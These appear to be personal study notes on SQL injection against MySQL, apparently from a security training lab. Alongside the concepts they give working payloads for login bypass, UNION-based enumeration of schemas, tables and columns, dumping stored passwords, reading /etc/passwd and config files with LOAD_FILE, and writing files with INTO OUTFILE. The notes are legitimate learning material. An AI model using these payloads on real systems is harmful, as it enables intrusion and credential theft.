#CWES #SQLi #mysql

#### Payloads:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

#### Concept: 
- Application uses a database to provide dynamic funtionalities, if userinput is not handled correctly, which can lead to the client executing database commands -> which we can exploit.
- SQLi can lead to: leak of sensitive information and elevation of privileges. 
- Cause of SQLi: Poorly coded web app or poorly secured back-end server and database. 

- **SQL = Relational databases**
- **NoSQL = Non-relational databases**

- SQL syntax of different databases may differ, but they all require to follow:  https://en.wikipedia.org/wiki/ISO/IEC_9075 



#### Mysql
- Any non-zero value is true (true=1), false is signified by 0.
- Note: logging into mysql might require --skip-ssl option to work. 
- AND operation takes precedence over OR operation. 


#### SQLi basics:
![[Pasted image 20260203181503.png]]

**In-band:**
- Output of the new query is printed to the front end, making it easier to debug if our query works.

- **Union Based**: We may have to spesify where the query output is to be printed. 
- **Error based**: When we can get the SQL errors in the front-end, so we can intentionally create queries that generate errors. 

**Blind:**
- Cannot see a direct output printed to the frontend.

- **Boolean based:** SQL conditional statements to control whether a page returns output, Example: return intended query output if our logical statement is true, else do not show output. 
- **Time based:** SQL conditional statements that delay the page response if the conditional statement returns true, using sleep().

**Out-of-band:**
- Cannot get direct access to query output, whatsoever, so have to be creative to evaluate the response of our modified query, example direct output to a remote location. 


#####  SQLi examples

**Example:**
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'admin';
```

Payload:
```
admin'#
```

Result:
```sql
SELECT * FROM logins WHERE username='admin'#' AND password = 'qwe';
```


**Example:**
```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '21232f297a57a5a743894a0e4a801fc3';
```

Payload:
```
'OR id=5)#
```

Result:
```sql
SELECT * FROM logins WHERE (username=''OR id=5)#' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```

#### Union clause SQLi
- UNION clause:  used to combine results from multiple SELECT statements.  
- The data types of the selected columns (from a UNION clause) on all positions should be the same.
- The data we SELECT with the UNION clause need to have the same number of columns 

- To bypass the type and column count restrictions of the UNION clause, we can SELECT "junk" strings.

IDEA: "escape" the indented query, and UNION our own query with it. 

**First step:** Find out the number of columns in the intended query.

Example payload: 
```sql
' ORDER BY 1#
```
- Closing the ''s, and ordering by the first column 
- Then try order by 2, then 3 and so on.
- When we get an error with this query, we know we have reached the limit of the column length. 

**Second step:** Figure out which columns from the table gets queried into the site.

Example payload:
```sql
' UNION SELECT 1,2,3,4#
```

Portcode 2, port city: 3, port volume: 4.

Can then try to query interesting info from the database, example:
- user(), version, etc. 

#### Enumerating DBMS:

**MYSQL version**
![[Pasted image 20260207145448.png]]

**INFORMATION_SCHEMA:**
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Things we are interested in:
- Database names
- Table names 
- Columns names

**Example:**
- Find the schemata
```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA#
```

- Find the tables
```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,database() from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'#

```

- Find column names
```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'#
```

- Get data we are interested in
```sql
' UNION select 1,password,username,4 FROM users#
```


#### Exploiting SQLi 

**Reading files:**
- Check privileges of the database user (Not all users can read code)
- Can us example: `SELECT LOAD_FILE('/etc/passwd');` to read files 

```
' UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'), 3, 4#
```

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**Writing files**
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Example of checking file write permissions:
```sql
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Taking a select query and writing the output to a file:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
